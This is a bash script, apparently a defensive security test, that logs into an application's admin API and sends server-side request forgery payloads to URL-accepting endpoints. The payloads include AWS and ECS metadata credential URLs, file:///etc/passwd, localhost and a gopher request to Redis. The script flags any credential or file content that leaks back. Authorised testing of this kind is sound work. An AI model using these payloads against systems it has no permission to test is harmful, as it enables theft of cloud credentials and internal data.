#!/usr/bin/env bash
#
# ssrf-probes.sh — manual SSRF probe.
#
# Admin endpoints often accept URL-shaped fields (SSO domain, integration base
# URLs, etc.). If a handler fetches those URLs server-side without validating
# the host, an attacker who controls an admin account (or finds an admin auth
# bypass) can force the backend to fetch AWS IMDS credentials, internal
# services, or arbitrary intranet hosts.
#
# This probe attempts each known URL-accepting admin endpoint with classic
# SSRF targets:
#   - 169.254.169.254 — AWS EC2 IMDSv1 metadata endpoint
#   - 169.254.170.2   — ECS task metadata
#   - 127.0.0.1:3000  — localhost
#   - 10.0.0.1        — RFC1918 internal
#   - file://         — local file scheme (some HTTP libraries support this)
#
# Expected: each request returns 400/403 (input validation refuses the host),
# or 200 with an error body that does NOT contain credential material / IMDS
# response shapes. A response time > 5s on an IMDS URL (without immediate
# rejection) is a strong signal the backend actually fetched it.
#
# Usage:
#   1. Set ZAP_ADMIN_USER / ZAP_ADMIN_PASS in .env.
#   2. ./ssrf-probes.sh
set -euo pipefail
cd "$(dirname "$0")"

[[ -f .env ]] || { echo "No .env found" >&2; exit 1; }

read_env() {
    local key="$1"
    python3 -c "
for l in open('.env'):
    l = l.rstrip('\n')
    if l.startswith('#') or '=' not in l: continue
    k, v = l.split('=', 1)
    if k.strip() == '$key':
        print(v); break
"
}

TARGET="$(read_env ZAP_TARGET)"
USER="$(read_env ZAP_ADMIN_USER)"
PASS="$(read_env ZAP_ADMIN_PASS)"

[[ -n "$TARGET" && -n "$USER" && -n "$PASS" ]] || {
    echo "ERROR: ZAP_TARGET / ZAP_ADMIN_USER / ZAP_ADMIN_PASS required in .env" >&2
    echo "SSRF probes need an admin account (system/integration permissions)" >&2
    exit 2
}

echo "==> minting admin token..."
TOKEN=$(curl -fsS -X POST "$TARGET/api/auth/login" \
    -H 'Content-Type: application/json' \
    -d "$(jq -nc --arg e "$USER" --arg p "$PASS" '{email:$e,password:$p}')" \
  | jq -r '.tokens.accessToken')
[[ -n "$TOKEN" && "$TOKEN" != "null" ]] || { echo "admin login failed" >&2; exit 3; }

SSRF_TARGETS=(
    "http://169.254.169.254/latest/meta-data/"
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    "http://169.254.170.2/v2/credentials/"
    "http://127.0.0.1:3000/api/admin/users"
    "http://10.0.0.1/"
    "http://[::1]:3000/"
    "file:///etc/passwd"
    "gopher://127.0.0.1:6379/_INFO"
)

FAIL_COUNT=0
WARN_COUNT=0
FAIL_LINES=()

PROBE_PUT() {
    local label="$1" endpoint="$2" body_template="$3"
    for url in "${SSRF_TARGETS[@]}"; do
        local body
        body=$(echo "$body_template" | sed "s|{SSRF}|$url|g")
        local start end duration code body_resp
        start=$(date +%s)
        body_resp=$(curl -s -m 8 -w '\nHTTP_CODE:%{http_code}' -X PUT "$TARGET$endpoint" \
            -H "Authorization: Bearer $TOKEN" \
            -H 'Content-Type: application/json' \
            -d "$body" 2>&1 || true)
        end=$(date +%s)
        duration=$((end - start))
        code=$(echo "$body_resp" | grep -oE 'HTTP_CODE:[0-9]+' | cut -d: -f2)
        body_clean=$(echo "$body_resp" | grep -v 'HTTP_CODE:' | head -c 200)
        evaluate_response "$label" "PUT $endpoint url=$url" "$code" "$duration" "$body_clean"
    done
}

PROBE_POST() {
    local label="$1" endpoint="$2" body_template="$3"
    for url in "${SSRF_TARGETS[@]}"; do
        local body
        body=$(echo "$body_template" | sed "s|{SSRF}|$url|g")
        local start end duration code body_resp
        start=$(date +%s)
        body_resp=$(curl -s -m 8 -w '\nHTTP_CODE:%{http_code}' -X POST "$TARGET$endpoint" \
            -H "Authorization: Bearer $TOKEN" \
            -H 'Content-Type: application/json' \
            -d "$body" 2>&1 || true)
        end=$(date +%s)
        duration=$((end - start))
        code=$(echo "$body_resp" | grep -oE 'HTTP_CODE:[0-9]+' | cut -d: -f2)
        body_clean=$(echo "$body_resp" | grep -v 'HTTP_CODE:' | head -c 200)
        evaluate_response "$label" "POST $endpoint url=$url" "$code" "$duration" "$body_clean"
    done
}

evaluate_response() {
    local label="$1" probe="$2" code="$3" duration="$4" body="$5"
    if echo "$body" | grep -qE 'AccessKeyId|SecretAccessKey|InstanceId|root:x:0:0|redis_version'; then
        printf '  %-4s %s [code=%s, %ds]  EVIDENCE OF SSRF in body!\n' FAIL "$probe" "$code" "$duration"
        FAIL_COUNT=$((FAIL_COUNT+1))
        FAIL_LINES+=("$label $probe — IMDS/file/redis content leaked")
        return
    fi
    if [[ "$probe" == *"169.254.169.254"* || "$probe" == *"169.254.170.2"* ]]; then
        if [[ "$duration" -gt 5 ]]; then
            printf '  %-4s %s [code=%s, %ds]  slow response — backend may have fetched IMDS\n' WARN "$probe" "$code" "$duration"
            WARN_COUNT=$((WARN_COUNT+1))
            return
        fi
    fi
    if [[ "$code" == "400" || "$code" == "403" || "$code" == "422" ]]; then
        printf '  %-4s %s [code=%s, %ds]  validation rejected\n' PASS "$probe" "$code" "$duration"
        return
    fi
    if [[ "$code" == "500" ]]; then
        printf '  %-4s %s [code=%s, %ds]  backend errored — verify it did not attempt the fetch\n' WARN "$probe" "$code" "$duration"
        WARN_COUNT=$((WARN_COUNT+1))
        return
    fi
    if [[ "$code" == "200" ]]; then
        printf '  %-4s %s [code=%s, %ds]  200 OK no IMDS evidence (handled gracefully)\n' PASS "$probe" "$code" "$duration"
        return
    fi
    printf '  %-4s %s [code=%s, %ds]\n' PASS "$probe" "$code" "$duration"
}

# PROJECT-SPECIFIC START
# These probes target the URL-accepting admin endpoints in your application.
# REPLACE them with your project's endpoints. Look for any admin handler that
# takes a URL/host/endpoint/domain field in its request body. Common shapes:
#   - SSO settings (issuer URL, metadata URL, callback)
#   - Integration config (webhook target, S3 endpoint, GraphQL URL)
#   - "Test connection" endpoints

echo "=== SSO settings — typically accepts SSO domain / issuer URLs ==="
PROBE_PUT "sso-settings" "/api/auth/sso/settings" \
    '{"enabled":true,"issuer":"{SSRF}","clientId":"x","clientSecret":"y","metadataUrl":"{SSRF}"}'

echo
echo "=== SSO test endpoint ==="
PROBE_POST "sso-test" "/api/auth/sso/test" '{"domain":"{SSRF}"}'

echo
echo "=== Integration settings — third-party base URL etc. ==="
PROBE_PUT "integrations" "/api/admin/integrations" \
    '{"providerBaseUrl":"{SSRF}","providerApiKey":"x"}'

echo
echo "=== Integration test endpoints ==="
PROBE_POST "test-s3" "/api/admin/integrations/test/s3" \
    '{"awsS3Endpoint":"{SSRF}","awsS3Bucket":"test","awsS3Region":"us-east-1","awsS3AccessKeyId":"AKIA","awsS3SecretAccessKey":"x"}'
PROBE_POST "test-graphql" "/api/admin/integrations/test/graphql" \
    '{"graphqlUrl":"{SSRF}","apiKey":"x"}'
# PROJECT-SPECIFIC END

echo
echo "=== Summary ==="
echo "  FAIL (definitive SSRF evidence): $FAIL_COUNT"
echo "  WARN (suspicious — manual review): $WARN_COUNT"
if [[ $FAIL_COUNT -gt 0 ]]; then
    echo
    echo "REAL SSRF FINDINGS:"
    printf '  - %s\n' "${FAIL_LINES[@]}"
    exit 1
fi
if [[ $WARN_COUNT -gt 0 ]]; then
    echo
    echo "Review the WARN lines manually — they may indicate the backend"
    echo "is fetching the URL even though no credential content leaked back."
fi
echo "No SSRF evidence found."
